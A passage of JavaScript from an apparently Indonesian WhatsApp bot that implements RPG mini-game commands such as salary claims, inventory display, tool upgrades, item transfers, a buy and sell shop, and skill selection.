            return [m].map((v) => v.toString().padStart(2, 0)).join(":");
          }

          function DeTik(ms) {
            let s = isNaN(ms) ? "60" : Math.floor(ms / 1000) % 60;
            return [s].map((v) => v.toString().padStart(2, 0)).join(":");
          }

          let LastClaim = db.data.users[m.sender].lastclaim;
          let cdm = `${MeNit(new Date() - LastClaim)}`;
          let cds = `${DeTik(new Date() - LastClaim)}`;
          let cd1 = Math.ceil(44 - cdm);
          let cd2 = Math.ceil(59 - cds);
          if (new Date() - db.data.users[m.sender].lastclaim > 2700000) {
            db.data.users[m.sender].money += 50000;
            db.data.users[m.sender].exp += 100;
            reply("Nih gaji lu +Rp50000");
            db.data.users[m.sender].lastclaim = new Date() * 1;
          } else
            return reply(
              `Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`
            );
        }
        break;

      case "me":
      case "inventory":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let inventory = {
            others: {
              joinlimit: true,
              health: true,
              money: true,
              chip: true,
              exp: true,
            },
            items: {
              bibitanggur: true,
              bibitmangga: true,
              bibitpisang: true,
              bibitapel: true,
              bibitjeruk: true,
              anggur: true,
              mangga: true,
              pisang: true,
              apel: true,
              jeruk: true,
              potion: true,
              trash: true,
              wood: true,
              rock: true,
              string: true,
              emerald: true,
              diamond: true,
              gold: true,
              iron: true,
              umpan: true,
              upgrader: true,
              pet: true,
              petfood: true,
            },
            durabi: {
              sworddurability: true,
              pickaxedurability: true,
              fishingroddurability: true,
              armordurability: true,
            },
            tools: {
              armor: {
                0: "❌",
                1: "Leather Armor",
                2: "Iron Armor",
                3: "Gold Armor",
                4: "Diamond Armor",
                5: "Emerald Armor",
                6: "Crystal Armor",
                7: "Obsidian Armor",
                8: "Netherite Armor",
                9: "Wither Armor",
                10: "Dragon Armor",
                11: "Hacker Armor",
              },
              sword: {
                0: "❌",
                1: "Wooden Sword",
                2: "Stone Sword",
                3: "Iron Sword",
                4: "Gold Sword",
                5: "Copper Sword",
                6: "Diamond Sword",
                7: "Emerald Sword",
                8: "Obsidian Sword",
                9: "Netherite Sword",
                10: "Samurai Slayer Green Sword",
                11: "Hacker Sword",
              },
              pickaxe: {
                0: "❌",
                1: "Wooden Pickaxe",
                2: "Stone Pickaxe",
                3: "Iron Pickaxe",
                4: "Gold Pickaxe",
                5: "Copper Pickaxe",
                6: "Diamond Pickaxe",
                7: "Emerlad Pickaxe",
                8: "Crystal Pickaxe",
                9: "Obsidian Pickaxe",
                10: "Netherite Pickaxe",
                11: "Hacker Pickaxe",
              },
              fishingrod: {
                0: "❌",
                1: "Wooden Fishingrod",
                2: "Stone Fishingrod",
                3: "Iron Fishingrod",
                4: "Gold Fishingrod",
                5: "Copper Fishingrod",
                6: "Diamond Fishingrod",
                7: "Emerald Fishingrod",
                8: "Crystal Fishingrod",
                9: "Obsidian Fishingrod",
                10: "God Fishingrod",
                11: "Hacker Fishingrod",
              },
            },
            crates: {
              common: true,
              uncommon: true,
              mythic: true,
              legendary: true,
            },
            pets: {
              horse: 10,
              cat: 10,
              fox: 10,
              dog: 10,
              robo: 10,
            },
            cooldowns: {},
          };

          let who =
            m.mentionedJid && m.mentionedJid[0]
              ? m.mentionedJid[0]
              : m.fromMe
              ? Kilianhst.user.jid
              : m.sender;
          let user = db.data.users[who];

          if (!(who in db.data.users))
            return reply(`User ${who} not in database`);

          let sortedlevel = Object.entries(db.data.users).sort(
            (a, b) => b[1].level - a[1].level
          );
          let userslevel = sortedlevel.map((v) => v[0]);
          let sortedchip = Object.entries(db.data.users).sort(
            (a, b) => b[1].chip - a[1].chip
          );
          let userschip = sortedchip.map((v) => v[0]);
          let sortedmoney = Object.entries(db.data.users).sort(
            (a, b) => b[1].money - a[1].money
          );
          let usersmoney = sortedmoney.map((v) => v[0]);
          let sorteddiamond = Object.entries(db.data.users).sort(
            (a, b) => b[1].diamond - a[1].diamond
          );
          let usersdiamond = sorteddiamond.map((v) => v[0]);
          let sortedbank = Object.entries(db.data.users).sort(
            (a, b) => b[1].bank - a[1].bank
          );
          let usersbank = sortedbank.map((v) => v[0]);
          let sortedgold = Object.entries(db.data.users).sort(
            (a, b) => b[1].gold - a[1].gold
          );
          let usersgold = sortedgold.map((v) => v[0]);

          let isMods = [
            Kilianhst.decodeJid(Kilianhst.user.id),
            ...global.owner
              .filter(([number, _, isOwner]) => number && isOwner)
              .map(([number]) => number),
          ]
            .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
            .includes(who);
          let isOwner =
            m.fromMe ||
            isMods ||
            [
              Kilianhst.decodeJid(Kilianhst.user.id),
              ...global.owner
                .filter(([number, _, isOwner]) => number && !isOwner)
                .map(([number]) => number),
            ]
              .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
              .includes(who);
          let isPrems = isOwner || new Date() - user.premiumTime < 0;

          let limit = isPrems ? "Unlimited" : user.limit;
          let tools = Object.keys(inventory.tools)
            .map(
              (v) =>
                user[v] &&
                `*${global.rpg.emoticon(v)} ${v}:* ${
                  typeof inventory.tools[v] === "object"
                    ? inventory.tools[v][user[v]?.toString()]
                    : `Level(s) ${user[v]}`
                }`
            )
            .filter((v) => v)
            .join("\n")
            .trim();
          let items = Object.keys(inventory.items)
            .map(
              (v) => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`
            )
            .filter((v) => v)
            .join("\n")
            .trim();
          let dura = Object.keys(inventory.durabi)
            .map(
              (v) => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`
            )
            .filter((v) => v)
            .join("\n")
            .trim();
          let crates = Object.keys(inventory.crates)
            .map(
              (v) => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`
            )
            .filter((v) => v)
            .join("\n")
            .trim();
          let pets = Object.keys(inventory.pets)
            .map(
              (v) =>
                user[v] &&
                `*${global.rpg.emoticon(v)} ${v}:* ${
                  user[v] >= inventory.pets[v]
                    ? "Max Levels"
                    : `Level(s) ${user[v]}`
                }`
            )
            .filter((v) => v)
            .join("\n")
            .trim();
          let cooldowns = Object.entries(inventory.cooldowns)
            .map(
              ([cd, { name, time }]) =>
                cd in user &&
                `*✧ ${name}*: ${new Date() - user[cd] >= time ? "✅" : "❌"}`
            )
            .filter((v) => v)
            .join("\n")
            .trim();

          let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : Kilianhst.getName(who)}* ${
            user.level
              ? `
➠ ${global.rpg.emoticon("level")} level: ${user.level}`
              : ""
          } ${
            user.limit
              ? `
➠ ${global.rpg.emoticon("limit")} limit: ${limit}`
              : ""
          }
${Object.keys(inventory.others)
  .map((v) => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`)
  .filter((v) => v)
  .join("\n")} ${
            tools
              ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}`
              : ""
          }${
            items
              ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}`
              : ""
          }${
            crates
              ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}`
              : ""
          }${
            pets
              ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}`
              : ""
          }${
            cooldowns
              ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon("chip")} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${
                  userschip.length
                }*
${global.rpg.emoticon("money")} ᴛᴏᴘ ᴍᴏɴᴇʏ *${
                  usersmoney.indexOf(who) + 1
                }* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon("bank")} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${
                  usersbank.length
                }*
${global.rpg.emoticon("level")} ᴛᴏᴘ ʟᴇᴠᴇʟ *${
                  userslevel.indexOf(who) + 1
                }* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon("diamond")} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${
                  usersdiamond.indexOf(who) + 1
                }* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon("gold")} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${
                  usersgold.length
                }*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}`
              : ""
          }
*✧ dungeon: ${user.lastdungeon == 0 ? "✅" : "❌"}*
*✧ mining: ${user.lastmining == 0 ? "✅" : "❌"}*
*✧ daily: ${user.lastclaimday == 0 ? "✅" : "❌"}*
*✧ monthly: ${user.lastclaimwek == 0 ? "✅" : "❌"}*
*✧ yearly: ${user.lastclaimyer == 0 ? "✅" : "❌"}*
`.trim();

          reply(`${caption}`);
        }
        break;

      case "upgrade":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let user = db.data.users[m.sender];
          let wood = user.wood * 1;
          let rock = user.rock * 1;
          let string = user.string * 1;
          let money = user.money * 1;
          let iron = user.iron * 1;
          let fishingrod = user.fishingrod * 1;
          let pickaxe = user.pickaxe * 1;
          let sword = user.sword * 1;
          let diamond = user.diamond * 1;
          let emerald = user.emerald * 1;
          let armor = user.armor * 1;
          let atm = user.atm;
          let type = (args[0] || "").toLowerCase();
          let prefix = command;

          let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} fishingRod*

*📌List yang Bisa Di Upgrade*
${rpg.emoticon("fishingrod")}FishingRod
${rpg.emoticon("pickaxe")}Pickaxe
${rpg.emoticon("sword")}Sword
${rpg.emoticon("armor")}Armor
${rpg.emoticon("atm")}Atm
`.trim();

          switch (type) {
            case "fishingrod":
              if (fishingrod == 0) {
                let lmao = `anda belum memiliki *🎣FishingRod*
untuk mendapatkannya ketik *${command}craft fishingrod*`;
                return reply(`${lmao}`);
              }
              if (fishingrod > 9)
                return reply(
                  `*${rpg.emoticon(
                    "fishingrod"
                  )}FishingRod* kamu sudah level max`
                );
              let _wood = fishingrod * 100;
              let _string = fishingrod * 100;
              let _money = fishingrod * 1000000;
              if (wood < _wood || string < _string || money < _money)
                return reply(
                  `Material kamu kurang!!${
                    wood < _wood
                      ? `\n${rpg.emoticon("wood")}wood Kamu Kurang *${
                          _wood - wood
                        }*`
                      : ""
                  }${
                    string < _string
                      ? `\n${rpg.emoticon("string")}String Kamu Kurang *${
                          _string - string
                        }*`
                      : ""
                  }${
                    user.money < _money
                      ? `\n${rpg.emoticon("money")}Uang Kamu Kurang *${
                          _money - money
                        }*`
                      : ""
                  }`
                );
              user.fishingrod += 1;
              user.wood -= _wood * 1;
              user.string -= _string * 1;
              user.money -= _money * 1;
              user.fishingroddurability = 0;
              user.fishingroddurability += fishingrod * 50;
              reply(
                `Succes mengupgrade *${rpg.emoticon("fishingrod")}FishingRod*`
              );
              break;

            case "pickaxe":
              if (pickaxe == 0) {
                let lmao = `anda belum memiliki *${rpg.emoticon(
                  "pickaxe"
                )}Pickaxe*
untuk memilikinya ketik *${command}craft Pickaxe*`;
                return reply(`${lmao}`);
              }
              if (pickaxe > 9)
                return reply(
                  `*${rpg.emoticon("pickaxe")}Pickaxe* kamu sudah level max!!`
                );
              let __rock = pickaxe * 250;
              let __wood = pickaxe * 150;
              let __money = pickaxe * 1500000;
              if (rock < __rock || wood < __wood || money < __money)
                return reply(`
Material Anda Kurang!!
${
  rock < __rock
    ? `\n${rpg.emoticon("rock")}rock kamu kurang *${__rock - rock}*`
    : ""
}${
                  wood < __wood
                    ? `\n${rpg.emoticon("wood")}wood kamu kurang *${
                        __wood - wood
                      }*`
                    : ""
                }${
                  money < __money
                    ? `\n${rpg.emoticon("money")}Uang kamu kurang *${
                        __money - money
                      }*`
                    : ""
                }`);
              user.pickaxe += 1;
              user.wood -= __wood * 1;
              user.rock -= __rock * 1;
              user.money -= __money * 1;
              user.pickaxedurability = 0;
              user.pickaxedurability += pickaxe * 50;
              reply(`Succes mengupgrade *${rpg.emoticon("pickaxe")}Pickaxe*`);
              break;

            case "sword":
              if (sword == 0) {
                let lmao = `anda belum memiliki *${rpg.emoticon("sword")}Sword*
untuk memilikinya ketik *${command}craft sword*`;
                return reply(`${lmao}`);
              }
              if (sword > 9)
                return reply(
                  `*${rpg.emoticon("sword")}Sword* kamu sudah level max!!`
                );
              let _iron = sword * 250;
              let ___wood = sword * 150;
              let ___money = sword * 1000000;
              if (iron < _iron || wood < ___wood || money < ___money)
                return reply(`
Material Anda Kurang!!
${
  iron < _iron
    ? `\n${rpg.emoticon("iron")}Iron kamu kurang *${_iron - iron}*`
    : ""
}${
                  wood < ___wood
                    ? `\n${rpg.emoticon("wood")}wood kamu kurang *${
                        ___wood - wood
                      }*`
                    : ""
                }${
                  money < ___money
                    ? `\n${rpg.emoticon("money")}Uang kamu kurang *${
                        ___money - money
                      }*`
                    : ""
                }`);
              user.sword += 1;
              user.iron -= _iron * 1;
              user.wood -= ___wood * 1;
              user.money -= ___money * 1;
              user.sworddurability = 0;
              user.sworddurability += sword * 50;
              reply(`Succes mengupgrade *${rpg.emoticon("sword")}Sword*`);
              break;

            case "armor":
              if (armor == 0) {
                let lmao = `anda belum memiliki *${rpg.emoticon("armor")}Armor*
untuk memilikinya ketik *${command}craft armor*`;
                return reply(`${lmao}`);
              }
              if (armor > 9)
                return reply(
                  `*${rpg.emoticon("armor")}Armor* kamu sudah level max!!`
                );
              let _diamond = armor * 5;
              let ____wood = armor * 150;
              let ____money = armor * 1000000;
              if (diamond < _diamond || wood < ____wood || money < ____money)
                return reply(`
Material Anda Kurang!!
${
  diamond < _diamond
    ? `\n${rpg.emoticon("diamond")}Diamond kamu kurang *${_diamond - diamond}*`
    : ""
}${
                  wood < ____wood
                    ? `\n${rpg.emoticon("wood")}wood kamu kurang *${
                        ____wood - wood
                      }*`
                    : ""
                }${
                  money < ____money
                    ? `\n${rpg.emoticon("money")}Uang kamu kurang *${
                        ____money - money
                      }*`
                    : ""
                }`);
              user.armor += 1;
              user.diamond -= _diamond * 1;
              user.wood -= ____wood * 1;
              user.money -= ____money * 1;
              user.armordurability = 0;
              user.armordurability += sword * 50;
              reply(`Succes mengupgrade *${rpg.emoticon("armor")}Armor*`);
              break;

            case "atm":
              if (atm == 0) {
                let lmao = `anda belum memiliki *${rpg.emoticon("atm")}Atm*
untuk memilikinya ketik *${command}craft atm*`;
                return reply(`${lmao}`);
              }
              if (atm > 999)
                return reply(
                  `*${rpg.emoticon("atm")}Atm* kamu sudah level max!!`
                );
              let __diamond = atm * 3;
              let _emerald = atm * 5;
              let _____money = atm * 10000;
              if (
                diamond < __diamond ||
                emerald < _emerald ||
                money < _____money
              )
                return reply(`
Material Anda Kurang!!
${
  diamond < __diamond
    ? `\n${rpg.emoticon("diamond")}Diamond kamu kurang *${__diamond - diamond}*`
    : ""
}${
                  emerald < _emerald
                    ? `\n${rpg.emoticon("emerald")}Emerald kamu kurang *${
                        _emerald - emerald
                      }*`
                    : ""
                }${
                  money < _____money
                    ? `\n${rpg.emoticon("money")}Uang kamu kurang *${
                        _____money - money
                      }*`
                    : ""
                }`);
              user.atm += 1;
              user.diamond -= __diamond * 1;
              user.emerald -= _emerald * 1;
              user.money -= _____money * 1;
              user.fullatm = 0;
              user.fullatm += atm * 500000000;
              reply(`Succes mengupgrade *${rpg.emoticon("atm")}Atm*`);
              break;
            default:
              return reply(`${teks}`);
          }
        }
        break;

      case "transfer":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function special(type) {
            let b = type.toLowerCase();
            let special = [
              "common",
              "uncommon",
              "mythic",
              "legendary",
              "pet",
            ].includes(b)
              ? " Crate"
              : "";
            return special;
          }

          function isNumber(x) {
            return !isNaN(x);
          }
          const items = [
            "money",
            "bank",
            "potion",
            "trash",
            "wood",
            "rock",
            "string",
            "petFood",
            "emerald",
            "diamond",
            "gold",
            "iron",
            "common",
            "uncommon",
            "mythic",
            "legendary",
            "pet",
            "chip",
            "anggur",
            "apel",
            "jeruk",
            "mangga",
            "pisang",
            "bibitanggur",
            "bibitapel",
            "bibitjeruk",
            "bibitmangga",
            "bibitpisang",
          ];
          let user = db.data.users[m.sender];
          const item = items.filter(
            (v) => v in user && typeof user[v] == "number"
          );
          let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @621927237001

📍 Transferable items
${item.map((v) => `${rpg.emoticon(v)}${v}`.trim()).join("\n")}
`.trim();
          const type = (args[0] || "").toLowerCase();
          if (!item.includes(type)) return reply(lol);
          const count =
            Math.min(
              Number.MAX_SAFE_INTEGER,
              Math.max(1, isNumber(args[1]) ? parseInt(args[1]) : 1)
            ) * 1;
          let who =
            m.mentionedJid && m.mentionedJid[0]
              ? m.mentionedJid[0]
              : args[2]
              ? args[2].replace(/[@ .+-]/g, "") + "@s.whatsapp.net"
              : "";
          let _user = db.data.users[who];
          if (!who) return reply("Tag salah satu, atau ketik Nomernya!!");
          if (!(who in db.data.users))
            return reply(`User ${who} not in database`);
          if (user[type] * 1 < count)
            return reply(
              `Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${
                count - user[type]
              }*`
            );
          let previous = user[type] * 1;
          let _previous = _user[type] * 1;
          user[type] -= count * 1;
          _user[type] += count * 1;
          if (previous > user[type] * 1 && _previous < _user[type] * 1)
            reply(
              `*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(
                type
              )} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(
                who || ""
              ).replace(/@s\.whatsapp\.net/g, "")}`,
              null,
              { mentions: [who] }
            );
          else {
            user[type] = previous;
            _user[type] = _previous;
            reply(
              `*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(
                type
              )}${type}${special(type)}\n*📨 To:* @${(who || "").replace(
                /@s\.whatsapp\.net/g,
                ""
              )}`,
              null,
              { mentions: [who] }
            );
          }
        }
        break;

      case "buy":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function isNumber(number) {
            if (!number) return number;
            number = parseInt(number);
            return typeof number == "number" && !isNaN(number);
          }

          function capitalize(word) {
            return word.charAt(0).toUpperCase() + word.substr(1);
          }
          const items = {
            buy: {
              limit: {
                exp: 9999,
              },
              chip: {
                money: 1000000,
              },
              exp: {
                money: 1000,
              },
              potion: {
                money: 1250,
              },
              trash: {
                money: 40,
              },
              wood: {
                money: 700,
              },
              rock: {
                money: 850,
              },
              string: {
                money: 400,
              },
              iron: {
                money: 3000,
              },
              diamond: {
                money: 500000,
              },
              emerald: {
                money: 100000,
              },
              gold: {
                money: 100000,
              },
              common: {
                money: 2000,
              },
              uncommon: {
                money: 20000,
              },
              mythic: {
                money: 75000,
              },
              legendary: {
                money: 200000,
              },
              petfood: {
                money: 3500,
              },
              pet: {
                money: 120000,
              },
              anggur: {
                money: 2000,
              },
              apel: {
                money: 2000,
              },
              jeruk: {
                money: 2000,
              },
              mangga: {
                money: 2000,
              },
              pisang: {
                money: 2000,
              },
              bibitanggur: {
                money: 2000,
              },
              bibitapel: {
                money: 2000,
              },
              bibitjeruk: {
                money: 2000,
              },
              bibitmangga: {
                money: 2000,
              },
              bibitpisang: {
                money: 2000,
              },
              umpan: {
                money: 5000,
              },
            },
            sell: {
              limit: {
                exp: 999,
              },
              exp: {
                money: 1,
              },
              chip: {
                money: 1000000,
              },
              potion: {
                money: 625,
              },
              trash: {
                money: 20,
              },
              wood: {
                money: 350,
              },
              rock: {
                money: 425,
              },
              string: {
                money: 200,
              },
              iron: {
                money: 1500,
              },
              diamond: {
                money: 250000,
              },
              emerald: {
                money: 50000,
              },
              gold: {
                money: 50000,
              },
              common: {
                money: 1000,
              },
              uncommon: {
                money: 10000,
              },
              mythic: {
                money: 37500,
              },
              legendary: {
                money: 100000,
              },
              petfood: {
                money: 1750,
              },
              pet: {
                money: 60000,
              },
              anggur: {
                money: 1000,
              },
              apel: {
                money: 1000,
              },
              jeruk: {
                money: 1000,
              },
              mangga: {
                money: 1000,
              },
              pisang: {
                money: 1000,
              },
              bibitanggur: {
                money: 1000,
              },
              bibitapel: {
                money: 1000,
              },
              bibitjeruk: {
                money: 1000,
              },
              bibitmangga: {
                money: 1000,
              },
              bibitpisang: {
                money: 1000,
              },
              umpan: {
                money: 2500,
              },
            },
          };

          const item = (args[0] || "").toLowerCase();
          if (
            !item.match("limit") &&
            global.db.data.chats[m.sender].rpg == false &&
            m.isGroup
          )
            return dfail("rpg", m, alicia);
          let user = global.db.data.users[m.sender];
          const listItems = Object.fromEntries(
            Object.entries(items[command.toLowerCase()]).filter(
              ([v]) => v && v in user
            )
          );
          let text = "";
          let footer = "";
          let image = "";
          let buttons = "";
          text =
            command.toLowerCase() == "buy"
              ? `
*𝙱𝚄𝚈𝙸𝙽𝙶*
`.trim()
              : `
*𝚂𝙴𝙻𝙻𝙸𝙽𝙶*
`.trim();
          footer =
            command.toLowerCase() == "buy"
              ? `
🛒 List Items :
${Object.keys(listItems)
  .map((v) => {
    let paymentMethod = Object.keys(listItems[v]).find((v) => v in user);
    return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${
      listItems[v][paymentMethod]
    } ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim();
  })
  .join("\n")}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
*乂 ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()
              : `
🛒 List Items :
${Object.keys(listItems)
  .map((v) => {
    let paymentMethod = Object.keys(listItems[v]).find((v) => v in user);
    return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${
      listItems[v][paymentMethod]
    } ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim();
  })
  .join("\n")}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
*乂 ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim();

          const total =
            Math.floor(
              isNumber(args[1])
                ? Math.min(
                    Math.max(parseInt(args[1]), 1),
                    Number.MAX_SAFE_INTEGER
                  )
                : 1
            ) * 1;
          if (!listItems[item]) return reply(footer);
          if (command.toLowerCase() == "buy") {
            let paymentMethod = Object.keys(listItems[item]).find(
              (v) => v in user
            );
            if (user[paymentMethod] < listItems[item][paymentMethod] * total)
              return reply(
                `Kamu membutuhkan *${
                  listItems[item][paymentMethod] * total - user[paymentMethod]
                }* ${capitalize(paymentMethod)} ${rpg.emoticon(
                  paymentMethod
                )} Lagi, Untuk Membeli *${total}* ${capitalize(
                  item
                )} ${rpg.emoticon(item)}. Kamu hanya memiliki *${
                  user[paymentMethod]
                }* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`
              );
            user[paymentMethod] -= listItems[item][paymentMethod] * total;
            user[item] += total;
            return reply(
              `Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(
                item
              )}*, Seharga *${
                listItems[item][paymentMethod] * total
              } ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`
            );
          } else {
            let paymentMethot = Object.keys(listItems[item]).find(
              (v) => v in user
            );
            if (user[item] < total)
              return reply(
                `You don't have enough *${capitalize(item)} ${rpg.emoticon(
                  item
                )}* to sell, you only have ${user[item]} items`
              );
            user[item] -= total;
            user[paymentMethot] += listItems[item][paymentMethot] * total;
            return reply(
              `Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(
                item
              )}*, Seharga *${
                listItems[item][paymentMethot] * total
              } ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`
            );
          }
        }
        break;

      case "selectskill":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let user = db.data.users[m.sender];
          let skill = [
            "swordmaster",
            "necromancer",
            "witch",
            "Archer",
            "magicswordmaster",
            "thief",
            "shadow",
          ];
          let bintang = {
            satu: "⭐",
            dua: "⭐⭐",
            tiga: "⭐⭐⭐",
            empat: "⭐⭐⭐⭐",
            lima: "⭐⭐⭐⭐⭐",
            Enam: "⭐⭐⭐⭐⭐⭐",
          };
          let skil = text.trim().toLowerCase(); // to filter text
          if (!skill.includes(skil))
            return reply(`Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:

${skill.map((skil) => `› ${skil}`).join("\n")}

How To use/Cara menggunakan:
${command} <nameskill>
 
Example/Contoh:
${command} necromancer
`);
          if (user.skill == "") {
            user.skill = skil;
            reply(`Anda telah memilih Skill ${skil}`);
          } else if (user.skill) {
            reply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`);
          }
        }
        break;

      case "sampah":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          const rewards = {
            exp: 500,
            money: 20999,
          };

          const cooldown = 2592000000;
          let user = db.data.users[m.sender];
          if (new Date() - user.lastmonthly < cooldown)
            return reply(
              `You have already claimed this monthly claim, wait for *${(
                user.lastmonthly +
                cooldown -
                new Date()
              ).toTimeString()}*`.trim()
            );
          let text = "";
          for (let reward of Object.keys(rewards))
            if (reward in user) {
              user[reward] += rewards[reward];
              text += `*+${rewards[reward]}* ${rpg.emoticon(
                reward
              )}${reward}\n`;
            }
          reply("*––––––『 NYAMPAH 』––––––*\n" + text.trim());
          user.lastmonthly = new Date() * 1;
        }
        break;

      case "roket":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let user = db.data.users[m.sender];
          let order = db.data.users[m.sender].rokets;
          let timers = clockString(_timers);
          let name = user.registered ? user.name : Kilianhst.getName(m.sender);
          let id = m.sender;
          let kerja = "Roket";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (user.health < 80)
            return reply(`Anda Harus Memiliki Minimal 80Health`);
          if (new Date() - db.data.users[m.sender].lastmisi > 3600000) {
            let ngerok4 = Math.floor(Math.random() * 10);
            let ngerok5 = Math.floor(Math.random() * 10);

            let ngrk4 = ngerok4 * 100000;
            let ngrk5 = ngerok5 * 1000;

            let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....
`.trim();

            let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....
`.trim();

            let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....
`.trim();

